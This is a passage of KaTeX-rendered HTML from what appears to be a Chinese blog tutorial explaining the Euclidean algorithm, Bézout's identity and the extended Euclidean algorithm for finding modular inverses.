class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span><span style="top:-3.4599999999999995em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mspace" style="margin-right:1em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span><span style="top:-1.6500000000000001em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">r</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">n</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mord mathrm">q</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">n</span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">r</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">n</span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">r</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">n</span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></p><p>因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>&gt;</mo><msub><mi>r</mi><mn>0</mn></msub><mo>&gt;</mo><msub><mi>r</mi><mn>1</mn></msub><mo>&gt;</mo><msub><mi>r</mi><mn>2</mn></msub><mo>&gt;</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">b&gt;r_0&gt;r_1&gt;r_2&gt;...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span>，故经过有限次除法后，总可以得到一个余数是零，即上式中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mn>0</mn><mo separator="true">,</mo><msub><mi>r</mi><mi>n</mi></msub><mo>=</mo><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r_{n+1}=0,r_n=\gcd(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span>。</p><p>以下是一个运用欧几里得算法求最大公约数的例子：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240623174423469.png" alt="image-20240623174423469" style="zoom:50%;" /><h2 id="扩展欧几里得算法"><a class="markdownIt-Anchor" href="#扩展欧几里得算法"></a> 扩展欧几里得算法</h2><p>扩展欧几里得算法是最通用且效率较高的方法之一。它不仅可以求解逆元，还可以用于求解线性同余方程和多项式逆元。</p><p>在介绍扩展欧几里得算法前，我们先引入一个定理：</p><blockquote><p>定理：任给整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>&gt;</mo><mi>b</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">a&gt;b&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，则存在两个整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x,y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mi>a</mi><mo>+</mo><mi>y</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">\gcd(a,b)=xa+yb</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">b</span></span></span></span>（贝祖等式）</p></blockquote><p>如何证明这个算法呢，通过逆向运用欧几里得算法就可以实现，而这个过程就是扩展欧几里得算法。</p><p>回到欧几里得算法的最后一项，依次将后一项代入前一项。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>r</mi><mi>n</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><msub><mi>q</mi><mi>n</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>3</mn></mrow></msub><mo>−</mo><msub><mi>r</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><msub><mi>q</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi mathvariant="normal">.</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi mathvariant="normal">.</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi mathvariant="normal">.</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>r</mi><mn>1</mn></msub><mo>=</mo><mi>b</mi><mo>−</mo><msub><mi>r</mi><mn>0</mn></msub><msub><mi>q</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>r</mi><mn>0</mn></msub><mo>=</mo><mi>a</mi><mo>−</mo><mi>b</mi><msub><mi>q</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr></mtable></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{c}\begin{aligned}r_{n} &amp; =r_{n-2}-r_{n-1} q_{n} \\r_{n-1} &amp; =r_{n-3}-r_{n-2} q_{n-1}\end{aligned}\\.\\.\\.\\\begin{array}{c}r_{1}=b-r_{0} q_{1} \\r_{0}=a-b q_{0}\end{array}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:9em;vertical-align:-4.25em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.750000000000001em;"><span style="top:-6.750000000000001em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2500000000000002em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2500000000000002em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-4.66em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord">.</span></span></span><span style="top:-3.4599999999999995em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord">.</span></span></span><span style="top:-2.2599999999999993em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord">.</span></span></span><span style="top:-0.4500000000000004em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord 